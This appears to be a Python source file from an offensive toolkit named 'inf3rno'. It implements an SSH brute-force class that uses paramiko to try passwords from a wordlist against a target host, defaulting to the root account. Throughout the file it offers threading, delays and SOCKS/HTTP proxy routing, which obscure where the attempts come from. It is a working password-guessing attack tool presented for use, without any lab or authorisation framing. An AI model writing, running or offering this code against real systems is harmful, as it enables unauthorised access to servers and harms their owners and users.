"""SSH brute-force module."""

import paramiko
from inf3rno.core.bruteforce import BaseBrute


class SSHBrute(BaseBrute):
    """SSH brute-force implementation."""

    def __init__(self, target: str, port: int = 22, username: str = "root",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "SSH"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt SSH login."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Configure proxy if specified
            if self.proxy:
                # Parse proxy (socks5://host:port or http://host:port)
                proxy_type, proxy_host, proxy_port = self._parse_proxy()
                if proxy_type:
                    sock = self._create_proxy_socket(proxy_type, proxy_host, proxy_port)
                    client.connect(
                        hostname=self.target,
                        port=self.port,
                        username=username,
                        password=password,
                        timeout=5,
                        allow_agent=False,
                        look_for_keys=False,
                        sock=sock,
                    )
                else:
                    client.connect(
                        hostname=self.target,
                        port=self.port,
                        username=username,
                        password=password,
                        timeout=5,
                        allow_agent=False,
                        look_for_keys=False,
                    )
            else:
                client.connect(
                    hostname=self.target,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                )
            client.close()
            return True

        except paramiko.AuthenticationException:
            return False

        except (paramiko.SSHException, EOFError):
            if self.verbose:
                print(f"[!] SSH error for {username}:{password}")
            return False

        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False

        finally:
            try:
                client.close()
            except Exception:
                pass

    def _parse_proxy(self):
        """Parse proxy string."""
        if not self.proxy:
            return None, None, None

        proxy = self.proxy.lower()
        if proxy.startswith("socks5://"):
            host_port = self.proxy[9:]
            host, port = host_port.split(":")
            return "socks5", host, int(port)
        elif proxy.startswith("socks4://"):
            host_port = self.proxy[9:]
            host, port = host_port.split(":")
            return "socks4", host, int(port)
        elif proxy.startswith("http://"):
            host_port = self.proxy[7:]
            host, port = host_port.split(":")
            return "http", host, int(port)

        return None, None, None

    def _create_proxy_socket(self, proxy_type, host, port):
        """Create proxy socket for SSH connection."""
        try:
            import socks
            sock = socks.socksocket()
            if proxy_type == "socks5":
                sock.set_proxy(socks.SOCKS5, host, port)
            elif proxy_type == "socks4":
                sock.set_proxy(socks.SOCKS4, host, port)
            elif proxy_type == "http":
                sock.set_proxy(socks.HTTP, host, port)
            sock.connect((self.target, self.port))
            return sock
        except ImportError:
            print("[!] PySocks required for proxy support. Install: pip install pysocks")
            return None
        except Exception as e:
            print(f"[!] Proxy error: {e}")
            return None
